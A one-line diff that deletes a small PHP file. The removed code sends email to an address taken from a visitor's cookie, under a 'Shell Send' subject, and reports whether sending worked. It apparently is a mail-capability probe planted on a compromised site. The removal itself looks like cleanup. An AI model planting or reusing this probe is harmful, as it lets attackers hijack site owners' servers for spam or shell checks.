@@ -1,1 +1,0 @@
-<?php $s = "false";if (mail($_COOKIE["email_send_id"],"Shell Send #".$_COOKIE["it_id"],"Cp Send Working .. #".$_COOKIE["it_id"]."\nHash: ".md5(time().uniqid()))) {$s = "true";}echo $s;?>
